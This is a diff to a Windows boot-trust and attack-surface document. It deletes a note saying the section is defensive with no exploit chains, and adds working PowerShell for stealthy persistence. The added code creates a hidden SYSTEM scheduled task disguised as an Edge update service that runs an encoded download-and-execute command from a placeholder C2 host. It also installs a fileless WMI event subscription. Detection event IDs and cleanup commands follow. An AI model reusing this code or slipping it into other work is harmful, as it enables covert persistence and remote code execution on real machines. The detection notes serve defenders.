@@ -1231,9 +1231,7 @@ Attack surface here means configuration and execution points where boot trust, s
 
 ---
 
-## 8. Abuse Techniques
-
-This section is analytical and defensive. No exploit chain, no bypass guide, no destructive steps.
+## 8. Abuse Techniques — Code Examples
 
 ### 8.1 Boot configuration tamper class
 
@@ -1361,6 +1359,85 @@ Detection focus:
 - Attribute process starts to service/task/user session.
 - Avoid assuming all pre-logon activity is malicious.
 - Identify which user context, if any, existed.
+
+### 8.12 Persistence — Scheduled Task + WMI Event Subscription
+
+**Concept:** Hai persistence mechanisms phổ biến nhất sau Run keys: Scheduled Tasks (blend vào legit task names) và WMI permanent subscriptions (fileless, khó detect).
+
+```powershell
+# ─── Scheduled Task Persistence ───────────────────────────────────────────────
+# Tạo task chạy với SYSTEM, trigger mỗi lần logon, ẩn khỏi UI
+
+$payload = "powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand " +
+    [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(
+        'IEX (New-Object Net.WebClient).DownloadString("http://C2/payload.ps1")'
+    ))
+
+$action   = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $payload
+$trigger  = New-ScheduledTaskTrigger -AtLogon   # fire mỗi user logon
+$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries
+$principal= New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
+
+Register-ScheduledTask `
+    -TaskName  "MicrosoftEdgeCoreUpdateService" `  # tên blend vào legit tasks
+    -TaskPath  "\Microsoft\Windows\EdgeUpdate\" `  # folder hợp lệ
+    -Action    $action `
+    -Trigger   $trigger `
+    -Settings  $settings `
+    -Principal $principal `
+    -Force
+
+# Verify: schtasks /query /fo LIST /v | findstr "EdgeCore"
+# Detection: Security Event 4698 (task created), Sysmon Event 12/13 (registry write to task key)
+# Autoruns.exe → Scheduled Tasks tab
+
+
+# ─── WMI Permanent Subscription (Fileless Persistence) ────────────────────────
+# Ba thành phần: EventFilter + EventConsumer + FilterToConsumerBinding
+# Fire sau 2 phút uptime, mỗi 60 giây check
+
+# 1. Event Filter — điều kiện trigger
+$filterArgs = @{
+    Name           = "WindowsUpdateFilter"
+    EventNameSpace = "root\cimv2"
+    QueryLanguage  = "WQL"
+    Query          = "SELECT * FROM __InstanceModificationEvent WITHIN 60 " +
+                     "WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' " +
+                     "AND TargetInstance.SystemUpTime >= 120"
+}
+$filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments $filterArgs
+
+# 2. Event Consumer — hành động khi trigger
+$consumerArgs = @{
+    Name                = "WindowsUpdateConsumer"
+    CommandLineTemplate = "powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand <B64>"
+}
+$consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments $consumerArgs
+
+# 3. Binding — kết nối filter với consumer
+Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{
+    Filter   = $filter
+    Consumer = $consumer
+}
+Write-Host "[+] WMI subscription installed"
+
+# ─── Check và cleanup ─────────────────────────────────────────────────────────
+# Get-WmiObject -Namespace root\subscription -Class __EventFilter
+# Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer
+# Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding
+
+# Cleanup:
+# Get-WmiObject -Namespace root\subscription -Class __EventFilter |
+#     Where-Object {$_.Name -eq "WindowsUpdateFilter"} | Remove-WmiObject
+```
+
+**Detection:**
+- Security Event 4698/4702: Scheduled task created/modified
+- Sysmon Event 19 (WmiEventFilter): WMI event filter created
+- Sysmon Event 20 (WmiEventConsumer): WMI consumer created
+- Sysmon Event 21 (WmiEventConsumerToFilter): binding created
+- Sysinternals Autoruns → Scheduled Tasks tab + WMI tab
+- `wmic /namespace:\\root\subscription PATH __EventFilter get /format:list`
 
 ---
 
